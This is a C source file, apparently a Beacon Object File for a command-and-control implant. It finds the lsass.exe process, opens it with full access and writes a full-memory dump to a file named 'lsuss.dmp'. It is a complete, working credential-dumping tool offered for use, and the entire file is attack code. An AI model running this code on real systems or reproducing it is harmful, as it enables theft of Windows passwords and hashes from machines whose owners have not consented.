#include <Windows.h>
#include <TlHelp32.h>
#include<DbgHelp.h>
#include <ProcessSnapshot.h>
#include "beacon.h"
#include "libc.h"

void go(char* argc, int len) {
    
	WINBASEAPI       DWORD     WINAPI KERNEL32$GetLastError();
	WINBASEAPI       FARPROC   WINAPI KERNEL32$GetProcAddress(HMODULE, LPCSTR);
	WINBASEAPI       HMODULE   WINAPI KERNEL32$GetModuleHandleA(LPCSTR);
	WINBASEAPI       BOOL      WINAPI KERNEL32$CloseHandle(HANDLE);
	DECLSPEC_IMPORT  BOOL      WINAPI KERNEL32$Process32First(HANDLE, void*);
	DECLSPEC_IMPORT  BOOL      WINAPI KERNEL32$Process32Next(HANDLE, void*);
	WINBASEAPI       HANDLE    WINAPI KERNEL32$OpenProcess(DWORD, BOOL, DWORD);
	DECLSPEC_IMPORT  HANDLE    WINAPI KERNEL32$CreateToolhelp32Snapshot(DWORD, DWORD);
	WINBASEAPI       HANDLE    WINAPI KERNEL32$CreateFileW(LPCWSTR ,DWORD ,DWORD,LPSECURITY_ATTRIBUTES ,DWORD , DWORD ,HANDLE );
	WINBASEAPI       BOOL	   WINAPI DBGHELP$MiniDumpWriteDump(HANDLE, DWORD, HANDLE, MINIDUMP_TYPE, PMINIDUMP_EXCEPTION_INFORMATION, PMINIDUMP_USER_STREAM_INFORMATION, PMINIDUMP_CALLBACK_INFORMATION);

	PROCESSENTRY32 entry;
	entry.dwSize = sizeof(PROCESSENTRY32);

	HANDLE snapshot = KERNEL32$CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

	int pid = -1;
	if (KERNEL32$Process32First(snapshot, &entry) == TRUE) {
		while (KERNEL32$Process32Next(snapshot, &entry) == TRUE) {
			if (mycmpi(entry.szExeFile, "lsass.exe")) {
				pid = entry.th32ProcessID;
				break;
			}
		}
	}
	KERNEL32$CloseHandle(snapshot);

	if (pid < 0) {
		BeaconPrintf(CALLBACK_ERROR, "Could not find lsass pid!");
		
	}


	// Open up a handle to LSASS
	HANDLE processHandle = KERNEL32$OpenProcess(
		PROCESS_ALL_ACCESS,
		FALSE,
		(int)pid
	);

	// Error handling
	if (processHandle == INVALID_HANDLE_VALUE)
	{
		BeaconPrintf(CALLBACK_ERROR, "Error! Unable to open a handle to the process. Error: 0x%lx\n", KERNEL32$GetLastError());
	}
	else {
		BeaconPrintf(CALLBACK_OUTPUT, "[+] Opened a handle to LSASS \n");
	}

	// Create Dump File
	HANDLE outFile = KERNEL32$CreateFileW(L"lsuss.dmp", GENERIC_ALL, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);

	if (outFile == INVALID_HANDLE_VALUE) {
		BeaconPrintf(CALLBACK_ERROR, "Error! Unable to createfile. Error: 0x%lx\n", KERNEL32$GetLastError());
	}else{

	BeaconPrintf(CALLBACK_OUTPUT, "[+] File Created \n");
	}

	// Full Dump
	BOOL Dumped = DBGHELP$MiniDumpWriteDump(processHandle, pid, outFile, MiniDumpWithFullMemory, NULL, NULL, NULL);

	if (Dumped) {
		BeaconPrintf(CALLBACK_OUTPUT, "Dump Created \n");
	}
	else {
		BeaconPrintf(CALLBACK_ERROR, "ERROR Dumping LSASS 0x%lx\n", KERNEL32$GetLastError());
	}

	// Close Handles
	KERNEL32$CloseHandle(outFile);
	KERNEL32$CloseHandle(processHandle);

}

